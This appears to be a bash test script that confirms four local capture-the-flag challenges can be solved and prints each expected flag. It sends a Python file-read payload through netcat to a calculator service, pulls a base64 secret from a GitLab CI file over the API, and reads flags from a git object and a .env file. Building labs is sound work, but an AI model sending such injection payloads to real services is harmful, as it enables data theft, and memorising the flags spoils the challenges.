#!/bin/bash

echo "Testing all challenges..."
echo "========================"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Function to print success/failure
print_result() {
    if [ $1 -eq 0 ]; then
        echo -e "${GREEN}[+] $2${NC}"
    else
        echo -e "${RED}[-] $2${NC}"
        exit 1
    fi
}

# Function to wait for service
wait_for_service() {
    local host=$1
    local port=$2
    local retries=$3
    local service_name=$4
    
    echo "[*] Waiting for $service_name to be ready..."
    for i in $(seq 1 $retries); do
        nc -z $host $port >/dev/null 2>&1
        if [ $? -eq 0 ]; then
            echo -e "${GREEN}[+] $service_name is ready${NC}"
            return 0
        fi
        echo -n "."
        sleep 2
    done
    echo -e "\n${RED}[-] $service_name failed to start${NC}"
    return 1
}

# Wait for services to be ready
wait_for_service localhost 31337 30 "Nutty Calculator" || exit 1
wait_for_service localhost 50002 30 "GitLab" || exit 1

echo "[*] Testing Nutty Calculator vulnerability..."
# Test Nutty Calculator using netcat
echo "open('flag.txt', 'r').read()" | timeout 5 nc localhost 31337 > /tmp/nutty_result.txt
if grep -q "flag{AcidSmellsLikeCheese}" /tmp/nutty_result.txt; then
    print_result 0 "Nutty Calculator is vulnerable to arbitrary file read"
else
    echo -e "${RED}[-] Failed to exploit Nutty Calculator. Debug output:${NC}"
    cat /tmp/nutty_result.txt
    echo -e "${RED}[-] Expected flag: flag{AcidSmellsLikeCheese}${NC}"
    exit 1
fi

echo "[*] Testing GitLab CI/CD vulnerability..."
# Get the base64 encoded secret from .gitlab-ci.yml and decode it
GITLAB_TOKEN=$(cat .gitlab_token)
for i in {1..3}; do
    # First try to get the file directly
    GITLAB_FLAG=$(curl -s --max-time 10 -H "PRIVATE-TOKEN: $GITLAB_TOKEN" http://localhost:50002/api/v4/projects/root%2Fdominos-coupon-cracker/repository/files/.gitlab-ci.yml/raw?ref=main | grep SECRET_COUPON | cut -d'"' -f2 | base64 -d)
    if [[ $GITLAB_FLAG == flag{* ]]; then
        echo "$GITLAB_FLAG" > /tmp/gitlab_flag.txt
        print_result 0 "Retrieved GitLab CI/CD flag"
        break
    fi
    echo "[*] Retrying GitLab flag retrieval (attempt $i)..."
    sleep 5
done

if [[ ! $GITLAB_FLAG == flag{* ]]; then
    echo -e "${RED}[-] Failed to get GitLab flag. Response:${NC}"
    curl -s --max-time 10 -H "PRIVATE-TOKEN: $GITLAB_TOKEN" http://localhost:50002/api/v4/projects/root%2Fdominos-coupon-cracker/repository/files/.gitlab-ci.yml/raw?ref=main
    exit 1
fi

echo "[*] Testing .git vulnerability..."
# Run the setup script to create the fakegit directory
echo "[*] Setting up fakegit directory..."
cd flask_app
chmod +x setup_fakegit.sh
./setup_fakegit.sh
cd ..

# Check if we can access the Git objects
if [ -f "flask_app/fakegit/objects/f2/0267c9f02b2553ba988182a245945b8b47693a" ]; then
    GIT_FLAG=$(git --git-dir=flask_app/fakegit cat-file -p f20267c9f02b2553ba988182a245945b8b47693a)
    if [[ $GIT_FLAG == flag{GitIsWeirdAintIt} ]]; then
        echo "$GIT_FLAG" > /tmp/git_flag.txt
        print_result 0 "Retrieved .git flag"
    else
        echo -e "${RED}[-] Failed to get .git flag. Debug output:${NC}"
        echo "$GIT_FLAG"
        echo -e "${RED}[-] Expected flag: flag{GitIsWeirdAintIt}${NC}"
        exit 1
    fi
else
    echo -e "${RED}[-] Failed to find Git object f20267c9f02b2553ba988182a245945b8b47693a${NC}"
    exit 1
fi

echo "[*] Testing .env vulnerability..."
# Check if we can access the .env file
if [ -f "flask_app/.env" ]; then
    ENV_FLAG=$(grep "FLAG=" flask_app/.env | cut -d'=' -f2 | tr -d ' ')
    if [[ $ENV_FLAG == flag{Dominos20percentOffCoupon1126} ]]; then
        echo "$ENV_FLAG" > /tmp/env_flag.txt
        print_result 0 "Retrieved .env flag"
    else
        echo -e "${RED}[-] Failed to get .env flag. Debug output:${NC}"
        echo "$ENV_FLAG"
        echo -e "${RED}[-] Expected flag: flag{Dominos20percentOffCoupon1126}${NC}"
        exit 1
    fi
else
    echo -e "${RED}[-] Failed to find .env file${NC}"
    exit 1
fi

echo "========================"
echo "Challenges tested:"
echo "------------"
echo "1. Nutty Calculator: VULNERABLE to arbitrary file read"
echo "2. GitLab CI/CD: Flag found in .gitlab-ci.yml"
echo "3. .git: Flag found in Git object"
echo "4. .env: Flag found in environment file"

# Clean up
rm -f /tmp/nutty_result.txt /tmp/gitlab_flag.txt /tmp/git_flag.txt /tmp/env_flag.txt 